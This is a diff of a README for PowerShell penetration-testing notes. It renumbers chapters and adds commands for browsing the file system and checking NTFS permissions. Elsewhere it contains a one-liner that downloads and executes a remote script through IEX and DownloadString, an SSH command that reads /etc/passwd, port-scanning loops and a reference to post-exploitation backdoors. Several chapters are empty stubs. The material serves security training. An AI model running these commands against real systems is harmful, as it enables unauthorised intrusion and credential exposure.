@@ -1,4 +1,4 @@
-specificrecursively# PowerShell for Penetration Testing
+# PowerShell for Penetration Testing
 
 Welcome to the [SnowCap Cyber](https://www.snowcapcyber.com) PowerShell for Penetration TestingGitHub repository. The goal of this repository is to provide you with a some notes that you may find useful when conducting a penetration test. Penetration begins with the ability to profile and map out a network, the systems and applications, and users associated with it. The PowerShell scripts in the document are repository and for PowerShell Version 7.3
 
@@ -114,7 +114,13 @@ Once you have a PowerShell shell then you can use the following to download file
 ```powershell
 PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://www.snowcapcyber.co.uk/PowerUp.ps1')
 ```
+## Chapter 2 - Access WMI, COM and .NET Functions in PowerShell
 
+```powershell
+PS C:\>
+```
+
+## Chapter 3 - Aces sing a File System in PowerShell
 PowerShell also supports a set of functions that allow us to explore and manipulate a file system. The 'Get-ChildItem' cmdlet gets the items in one or more specified locations. You can think of it like the 'ls' command in UNIX, or the 'dir' command in Windows/MS-DOS. In the following we will list the contents of the 'C:\Test' directory.
 
 ```powershell
@@ -173,8 +179,133 @@ Mode                LastWriteTime         Length Name
 
 As a site note the HHH cmdlet will also let is query the Windows Registry. Now that we have the ability to use PowerShell and find/install modules we can begin to use it to perform a penetration test.
 
-## Chapter 2 - Network Mapping
+We can also use PowerShell to perform other functions on a file system. We can identify our current location in the file system using the 'Get-Location' cmdlets.
 
+```powershell
+PS C:\> Get-Location
+
+Path
+----
+C:\Windows
+```
+
+We can also use the 'Set-Location' command to move around a file system and change our current working directory.
+
+```powershell
+PS C:\> Set-Location C:\Windows
+```
+
+We can also view the contents of a file using the Get-Content command.
+
+```powershell
+PS C:\> Get-Content .\myfile.txt
+```
+
+There are also a number of modules that support access and manipulation of file permissions. The 'NTFSSecurity' module supports a number of file functions.
+
+```powershell
+PS C:\> install-module -name NTFSSecurity
+```
+
+We can use the 'Get-Diskspace'  to get information about the file system and disk space as follows:
+
+```powershell
+PS C:\> Get-Diskspace
+
+AvailableFreeSpacePercent  : 70.8%
+AvailableFreeSpaceUnitSize : 42.25 GB
+ClusterSize                : 4096
+DriveName                  : \\?\Volume{7e876034-3aed-4257-806e-e838ecd3d8e3}\
+TotalSizeUnitSize          : 59.68 GB
+UsedSpacePercent           : 29.2%
+UsedSpaceUnitSize          : 17.43 GB
+FreeBytesAvailable         : 45368008704
+TotalNumberOfBytes         : 64078475264
+TotalNumberOfFreeBytes     : 45368008704
+BytesPerSector             : 512
+NumberOfFreeClusters       : 11076174
+SectorsPerCluster          : 8
+TotalNumberOfClusters      : 15644159
+```
+
+We can also access the file access permissions using the 'Get-NTFSAccess' command.
+
+```powershell
+PS C:\> Get-NTFSAccess  .
+
+    Path: C:\Program Files\PowerShell\7 (Inheritance enabled)
+
+
+Account                             Access Rights          Applies to                Type                  IsInherited           InheritedFrom
+-------                             -------------          ----------                ----                  -----------           -------------
+NT SERVICE\TrustedInstaller         FullControl            ThisFolderOnly            Allow                 True                  C:\Program Files
+NT SERVICE\TrustedInstaller         GenericAll             SubfoldersOnly            Allow                 True                  C:\Program Files
+NT AUTHORITY\SYSTEM                 FullControl            ThisFolderOnly            Allow                 True                  C:\Program Files
+NT AUTHORITY\SYSTEM                 GenericAll             SubfoldersAndFilesOnly    Allow                 True                  C:\Program Files
+BUILTIN\Administrators              FullControl            ThisFolderOnly            Allow                 True                  C:\Program Files
+BUILTIN\Administrators              GenericAll             SubfoldersAndFilesOnly    Allow                 True                  C:\Program Files
+BUILTIN\Users                       ReadAndExecute, Synch… ThisFolderOnly            Allow                 True                  C:\Program Files
+BUILTIN\Users                       GenericExecute, Gener… SubfoldersAndFilesOnly    Allow                 True                  C:\Program Files
+CREATOR OWNER                       GenericAll             SubfoldersAndFilesOnly    Allow                 True                  C:\Program Files
+APPLICATION PACKAGE AUTHORITY\ALL … ReadAndExecute, Synch… ThisFolderOnly            Allow                 True                  C:\Program Files
+APPLICATION PACKAGE AUTHORITY\ALL … GenericExecute, Gener… SubfoldersAndFilesOnly    Allow                 True                  C:\Program Files
+```
+
+Once we understand the access rights for a file/directory we can now start to explore the access times via the 'Get-ChildItem2' command as follows:
+
+```powershell
+PS C:\> Get-ChildItem2
+
+        Directory: C:\Program Files\PowerShell\7
+
+
+Mode    Inherits             LastWriteTime         Size(M) Name
+----    --------             -------------         ------- ----
+-a---       True      19/10/2022     02:23            0.02 Accessibility.dll
+d----       True      30/11/2022     23:43   <DIR>         assets
+-a---       True      18/10/2022     17:08             0.3 clretwrc.dll
+-a---       True      18/10/2022     17:01            0.63 clrgc.dll
+-a---       True      18/10/2022     17:03            1.46 clrjit.dll
+```
+
+We can identify the owner of a file as follows:
+```powershell
+PS C:\> Get-NTFSOwner CMAK
+
+Item                  Owner               Account             FullName
+----                  -----               -------             --------
+C:\Program Files\CMAK NT AUTHORITY\SYSTEM NT AUTHORITY\SYSTEM C:\Program Files\CMAK
+```
+
+We can also enumerate the privileges of the current user as follows:
+
+```powershell
+PS C:\> Get-Privileges
+
+         Privilege       PrivilegeAttributes PrivilegeState
+         ---------       ------------------- --------------
+          Shutdown                  Disabled       Disabled
+      ChangeNotify EnabledByDefault, Enabled        Enabled
+            Undock                  Disabled       Disabled
+IncreaseWorkingSet                  Disabled       Disabled
+          TimeZone                  Disabled       Disabled
+```
+
+If we have sufficient privileges can change the owernship of a file/directory using the '' command.
+
+```powershell
+PS C:\> get-help Set-NTFSOwner
+
+NAME
+    Set-NTFSOwner
+
+SYNTAX
+    Set-NTFSOwner [[-Path] <string[]>] [-Account] <IdentityReference2> [-PassThru] [<CommonParameters>]
+
+    Set-NTFSOwner [-SecurityDescriptor] <FileSystemSecurity2[]> [-Account] <IdentityReference2> [-PassThru] [<CommonParameters>]
+```    
+
+## Chapter 4 - Network Mapping and Port Scanning
 We can use PowerShell to perform ICMP pings and traceroute. To perform an ICMP ping we simply make use of the PowerShell command as follows. The Test Connection cmdlet sends Internet Control Message Protocol (ICMP) Echo request packets to one or more comma-separated remote hosts and returns the Echo responses. When using Test-Connection we can use and DNS name or an IP address as shown below.
 ```powershell
 PS C:\> Test-Connection www.google.com
@@ -214,8 +345,6 @@ TraceRoute             : 192.168.1.1
                          138.187.129.97
                          1.1.1.1
 ```
-
-## Chapter 3 - Port Scanning Tool
 
 The trick when creating and using tools for Penetration Testing is not to reinvent the year. There are a number of port scanning tools for TCP and UDP that we can access via GitHub.
 
@@ -350,7 +479,7 @@ We cab also use the [PowerCat](https://github.com/secabstraction/PowerCat) tool 
 PS C:\> 1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp server01.snowcapcyber.co.uk -Port $_ -Timeout 1 -Verbose }
 ```    
 
-## Chapter 4 - Banner Grabbing and OS Fingerprinting
+## Chapter 5 - Banner Grabbing and OS Fingerprinting
 Once we have mapped out the structure and topology of a network the next stage in the Penetration Testing process is to capture version information about the services running and a target host operating system. To identify the operating of the local computer system we will use a WMI object as follows:
 ```powershell
 PS C:\> (Get-WmiObject Win32_OperatingSystem).Caption
@@ -389,8 +518,7 @@ prompt>
 
 So in the above we are going to connect an HTTP/WWW server and then send commands and receive/display the results.
 
-## Chapter 5 - File Transfer Protocol (FTP)
-
+## Chapter 6 - File Transfer Protocol (FTP)
 When performing a penetration test on a FTP server there are three basic functions that we need to perform. We need to be able to list the contents of directory on an FTP server as well as Upload and download files to the FTRp server. There are a number of tools that allow for us to access FTP.
 
 We can use the following PowerShell to list the contents of a directory on an FTP server. In the following we connect to an FTP server and execute the ListDirectoryDetails function to get a list of files. Once we have a list of files we the read them one at a time and write them out.
@@ -461,8 +589,7 @@ Once we have download a file then we can attempt to upload the file. The success
 PS C:\> Get-FTP -Server ftp.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -RemoteFile Pub/archive.zip -LocalFile C:\>/temp/archive.zip
 ```
 
-## Chapter 6 - Secure Shell (SSH), Secure FTP (SFTP) and Secure Copy (SCP)
-
+## Chapter 7 - Secure Shell (SSH), Secure FTP (SFTP) and Secure Copy (SCP)
 The Secure Shell (SSH) allows us to engage in a secure interactive command line session with a client.  It achieves this via the implementation of a set of encryption algorithms. Secure FTP (SFTP) and Secure Copy (SCP) make use of SSH to facilitate Secure FTP and a Secure Copy functions between a client and a server. For SFTP and SCP to function the server much be running Secure Shell (SSH). In this section we will make uses of the NetCmdlets PowerShell module to access a SSH Server.
 
 * [The NetCmdlets Module](https://cdn.nsoftware.com/help/NCF/cmd/default.htm)
@@ -503,8 +630,7 @@ By default the commands, Get-SSH, Get-SCP and Get-SFTP use the default TCP port 
 PS C:\> Invoke-SSH -Server ssh.snowcapcyber.co.uk -User ajcblyth -Password MyPa55w0rdOK -Port 2222 -Command 'cat /etc/passwd'
 ```
 
-## Chapter 7 - The Web (WWW)
-
+## Chapter 8 - The Web (WWW)
 There are a number of modules and applications that we can use to profile a and exploit a web server.
 
 * [PowerCat](https://github.com/secabstraction/PowerCat)
@@ -573,8 +699,7 @@ We can also use [PowerCat](https://github.com/secabstraction/PowerCat)  to conne
 PS C:\> Connect-PowerCat -Mode Tcp -RemoteIp 10.12.148.14 -Port 443 -SslCn PowerCat
 ```
 
-## Chapter 8 - Windows File Sharing (SMB)
-
+## Chapter 9 - Windows File Sharing (SMB)
 Windows makes use of Server Message Block (SMB) to allow for files to be shared over a network. Using PowerShell we can query the local machine to see what SMB shares it is making use of. To do this we must have the correct permissions otherwise the Get-SmbConnection cmdlet will return an error and say that access has been denied.
 ```powershell
 PS C:\> Get-SmbConnection
@@ -631,8 +756,7 @@ Status       Local     Remote                    Network
 OK           X:        \\Server01\Scripts        Microsoft Windows Network
 ```
 
-## Chapter 9 - Active Directory and LDAP
-
+## Chapter 10 - Active Directory and LDAP
 PowerShell comes with a series of tools that support access-to, and manipulation-of, Active Directory. We can start by profiling the local machine and identifying Active Directory Information.
 
 ```powershell
@@ -853,7 +977,7 @@ We can also use a distinguished name when clearing an account.
 PS C:\>  Clear-ADAccountExpiration -Identity "CN=John Smith,OU=PenTesters,DC=snowcapcyber,DC=co,DC=uk"
 ```
 
-## Chapter 10 - SQL Database
+## Chapter 11 - SQL Database
 
 On the Internet the following is a list of most common databases to be found.
 
@@ -865,7 +989,7 @@ On the Internet the following is a list of most common databases to be found.
 PS C:\> Execute-Command-MSSQL
 ```
 
-## Chapter 11 - Domain Name System (DNS)
+## Chapter 12 - Domain Name System (DNS)
 
 The Domain Name System (DNS) allows us to map a name to an IP address. In the following we will use a simple function to query a fully qualified name (FQDN).
 ```powershell
@@ -886,7 +1010,7 @@ HostName        Aliases AddressList
 DESKTOP-4LDHIQB {}      {fe80::c430:acb4:231e:15c5%5, fe80::d5b8:5025:b43e:cdd1%8, 172.16.24.175, 192.168.2.110}
 ```
 
-## Chapter 12 - Simple Network Management Protocol (SNMP)
+## Chapter 13 - Simple Network Management Protocol (SNMP)
 
 The Simple Network Management Protocol (SNMP) is a UDP based protocol design to allow for networked devices to be configured and managed. A SNMPP server will run on UDP port 161. In the following example we will use SNMP to query a machines hostname. We will create a SNMP object and then connect to 192.168.2.187 (snmp.snowcapcyber.co.uk) using the key 'public as the authentication string.
 
@@ -943,33 +1067,25 @@ Function        Set-SnmpData                                       1.0.0.1    SN
 PS C:\>
 ```
 
-## Chapter 13 - Email Services (SMTP, POP and IMAP)
+## Chapter 14 - Email Services (SMTP, POP and IMAP) and Other Services
 
 ```powershell
 PS C:\>
 ```
 
-## Chapter 14 - Azure
+## Chapter 15 - Azure
 
 ```powershell
 PS C:\>
 ```
 
-## Chapter 15 - AWS
-
-```powershell
-PS C:\>
-```
-
-
-## Chapter 16 - Other Services
+## Chapter 16 - AWS
 
 ```powershell
 PS C:\>
 ```
 
 ## Chapter 17 - Brute Forcing
-
 Once we have identified a series of TCP services that support authentication then we cab start to Brute force a connection to them. To do this we will make use of the following tools.
 
 * [Offensive PowerShell](https://github.com/samratashok/nishang)
@@ -979,7 +1095,6 @@ PS C:\>
 ```
 
 ## Chapter 18 - User Profiling
-
 Once we have exploited a system we start to profile a system using a set of PowerShell commands. We can start be listing the users on the target system.
 ```powershell
 PS C:\> Get-LocalUser
@@ -1081,7 +1196,6 @@ User        WIN11\jsmith         Local
 ```
 
 ## Chapter 19 - Profiling Local/Remote Systems
-
 Profiling the target system starts with us profiling the execution policy. The Execution policy defines how, when and where PowerShell Scripts can be executed. To identify the execution policy we can use the Get-ExecutionPolicy PowerShell command.
 ```powershell
 PS C:\>  Get-ExecutionPolicy
@@ -1280,7 +1394,6 @@ PS C:\> Invoke-Command -ComputerName dc03.snowcapcyber.co.uk -ScriptBlock { Get-
 ```
 
 ## Chapter 20 - Post Exploitation
-
 There are a number of tools we can use to post exploitation to help us establish some form of command and control. We can use PowerShell to create a back door to the target system.
 
 * [PowerCat](https://github.com/besimorhino/powercat)
